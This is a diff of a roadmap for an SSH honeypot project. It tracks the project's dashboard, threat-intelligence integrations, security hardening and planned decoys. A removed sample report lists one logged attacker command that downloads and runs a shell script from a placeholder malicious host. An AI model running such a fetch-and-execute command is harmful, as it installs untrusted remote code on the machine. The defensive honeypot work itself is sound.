@@ -63,85 +63,138 @@ The first milestone combines daily reporting with essential threat intelligence 
 - [x] Automatic Postfix configuration for Scaleway Transactional Email
 - [x] Configurable reporting intervals and thresholds
 
-### Report Format
-```text
-Subject: [Honeypot] Daily Report - 2024-12-06 - 847 attacks from 124 IPs
+## Phase 2: Dashboard & Visualization ✅ COMPLETED
 
-SUMMARY
--------
-Connections: 847
-Unique IPs: 124
-Top country: China (45%), Russia (23%), USA (12%)
-Sessions with commands: 34
-Files downloaded: 3
+### Custom Flask Web Dashboard
+- [x] Simple Flask web app
+- [x] Read from JSON logs directly
+- [x] Display features:
+  - [x] Dashboard with attack statistics
+  - [x] Recent sessions with TTY replay capability (asciinema-player)
+  - [x] GeoIP integration with ASN data
+  - [x] Top attackers by country, IP, credentials
+  - [x] Downloaded file browser with VirusTotal links and YARA matches
+  - [x] Session filtering by IP, username, date range
+  - [x] Integration with email reports (session links)
+  - [x] Tailscale Serve for HTTPS access
+  - [x] Docker deployment with security hardening
 
-TOP CREDENTIALS
----------------
-root:123456 (156 attempts)
-admin:admin (89 attempts)
-...
+## Phase 3: Extended Features & Integrations
 
-DOWNLOADED FILES
-----------------
-SHA256: abc123...
-  Size: 45KB
-  YARA: Mirai_Botnet, UPX_Packed
-  VirusTotal: 52/70 detections
-  VT Link: https://virustotal.com/...
-
-GEO DISTRIBUTION
-----------------
-[ASCII map or link to HTML version]
-
-NOTABLE COMMANDS
-----------------
-wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
-...
-```
-
-## Phase 2: Dashboard & Visualization
-
-### Option 3: Custom Dashboard
-- [ ] Simple Flask/FastAPI web app
-- [ ] Read from JSON logs directly
-- [ ] Display:
-  - Live connection map (IP geolocation)
-  - Recent sessions with replay capability
-  - Attack timeline graph
-  - Credential wordcloud
-  - Downloaded file analysis (reuse Phase 1 VT/YARA integration)
-
-## Phase 3: Log Management & Extended Threat Intel
-
-### Centralized Logging
+### Log Management
 - [ ] Ship logs to central syslog server
 - [ ] S3/MinIO backup for long-term storage
 - [ ] Log rotation configuration
 - [ ] Retention policies (e.g., 90 days on-disk, 1 year archived)
+- [ ] ElasticSearch/OpenSearch integration for advanced querying
 
-### Extended Threat Intelligence
+### Extended Threat Intelligence ⚡ PARTIALLY COMPLETED
 
-Additional threat intel sources:
-
-- AbuseIPDB reputation lookup
-- [ ] Shodan host information
+Completed integrations:
+- [x] VirusTotal with extended threat intelligence (threat labels, categories, families)
 - [x] GreyNoise classification (benign scanner vs malicious)
+- [x] DShield (SANS ISC) data sharing
+- [x] MaxMind GeoIP with ASN enrichment
+- [x] YARA scanning with real-time daemon (YARA Forge ruleset)
+
+Future integrations:
+- [ ] AbuseIPDB reputation lookup and reporting
+- [ ] Shodan host information enrichment
 - [ ] AlienVault OTX pulse correlation
+- [ ] MISP event creation and sharing
+- [ ] Hybrid Analysis sandbox submission
+- [ ] URLhaus malicious URL correlation
 
-## Future: Honeypot Enhancements
+## Phase 4: Security Hardening & Code Quality ⚡ PARTIALLY COMPLETED
 
-### Additional Realism
+Based on security analysis, the following improvements have been implemented or are planned:
 
-- [ ] Custom txtcmds for more commands (df, free, top, etc.)
-- [ ] Fake MySQL/PostgreSQL databases with sample data
+### Critical Security Fixes
+- [x] **COMPLETED**: Replace sed/grep TOML parsing with proper TOML parser
+  - Implemented `scripts/read-toml.py` using Python's builtin `tomllib` (Python 3.11+)
+  - Eliminates shell injection risks from TOML parsing
+- [x] **COMPLETED**: Add input validation for TOML config values
+  - Implemented validation functions: `validate_ip`, `validate_safe_string`, `validate_server_id`
+  - Deployed in all scripts that process user/config input
+- [ ] Whitelist and validate secret manager commands (currently only checks for "op read" prefix)
+- [ ] Add checksum verification for downloaded scripts (Docker install, Tailscale)
+- [ ] Implement proper SSH host key verification instead of `-o StrictHostKeyChecking=no`
+
+### Code Quality Improvements ✅ MOSTLY COMPLETED
+- [x] **COMPLETED**: Add dependency checking (jq, nc, tar, hcloud) before execution
+  - Created `check_dependencies` function in `scripts/common.sh`
+  - All deployment scripts now fail fast with helpful messages if dependencies are missing
+- [x] **COMPLETED**: Extract common SSH connection options into variables
+  - Implemented `ssh_exec`, `scp_copy`, `wait_for_ssh` helper functions
+  - Centralized SSH options in `scripts/common.sh`
+- [x] **COMPLETED**: Consolidate TOML parsing logic into shared functions
+  - Created `read_toml_value` and `read_toml_default` functions
+  - All scripts use unified TOML reading approach
+- [x] **COMPLETED**: Improve error messages with specific failure details
+  - Implemented color-coded output: `echo_info`, `echo_warn`, `echo_error`, `fatal_error`
+  - Standardized error messages across all scripts
+- [x] **COMPLETED**: Add cleanup traps for all temporary files
+  - Created `create_temp_file`, `create_temp_dir`, `cleanup_temp_files` functions
+  - Automatic cleanup on EXIT, INT, TERM signals
+  - Secure random temp file names using `mktemp`
+- [x] **COMPLETED**: Configurable paths via master-config.toml
+  - Added `[advanced.paths]` section to `example-config.toml`
+  - Eliminates hardcoded paths throughout the codebase
+- [x] **PARTIALLY COMPLETED**: Replace fixed sleep statements with service readiness polling
+  - Implemented `wait_for_ssh` function with timeout and exponential backoff
+  - Fixed sleeps still used in some deployment steps (can be improved)
+- [ ] Add comprehensive logging of deployment actions to syslog
+
+### Web Dashboard Security ⚡ PARTIALLY COMPLETED
+- [x] **COMPLETED**: Password-protected ZIP downloads for malware samples
+  - Implemented using pyzipper with AES encryption
+  - Standard password: "infected" (malware research convention)
+- [x] **COMPLETED**: XSS protection verified (Jinja2 auto-escaping enabled by default)
+- [ ] Add rate limiting to API endpoints
+- [ ] Add CSRF tokens for any write operations (currently read-only dashboard)
+- [ ] Add authentication layer for production deployments (currently secured via Tailscale)
+
+## Phase 5: Honeypot Enhancements
+
+### Additional Realism ⚡ PARTIALLY COMPLETED
+
+Completed:
+- [x] WordPress with fake corporate blog database
+- [x] MySQL/MariaDB with realistic wp-config.php
+- [x] Canary Token integration (MySQL dump, Excel, PDF)
+- [x] Custom txtcmds for realistic command output
+- [x] Process list with nginx and MySQL
+
+Future enhancements:
+- [ ] More custom txtcmds (df, free, top, netstat with realistic data)
 - [ ] Realistic cron jobs in process list
-- [ ] Fake user home directories with files
-- [ ] Web honeypot on port 80/443 (nginx with fake admin panels)
-- [ ] Add files and more from <https://canarytokens.org/nest/>
+- [ ] Multiple fake user home directories with SSH keys and files
+- [ ] Web honeypot on port 80/443 (nginx with fake admin panels, phpMyAdmin)
+- [ ] Fake .git repositories with commit history
+- [ ] Fake CI/CD configuration files (.github/workflows, .gitlab-ci.yml)
+- [ ] Additional Canary Token types (AWS credentials, Kubeconfig, browser saved passwords)
 
 ### Multiple Honeypot Deployment
 
 - [ ] Deploy fleet across multiple Hetzner locations
-- [ ] Centralized log collection
+- [ ] Centralized log collection with aggregation dashboard
 - [ ] Configuration management (Ansible playbooks)
+- [ ] Automated honeypot rotation (destroy and redeploy weekly)
+- [ ] Distributed intelligence sharing between honeypots
+
+## Phase 6: Advanced Analytics
+
+### Machine Learning & Behavioral Analysis
+- [ ] Anomaly detection for unusual attack patterns
+- [ ] Attacker profiling and tracking across sessions
+- [ ] Automated IOC extraction and threat hunting
+- [ ] Predictive analytics for attack forecasting
+- [ ] Clustering of similar attack campaigns
+
+### Advanced Visualizations
+- [ ] Interactive attack timeline with D3.js
+- [ ] Geospatial heatmap of attacks over time
+- [ ] Network graph of attacker infrastructure
+- [ ] Credential wordcloud with frequency analysis
+- [ ] Command execution flow diagrams
 
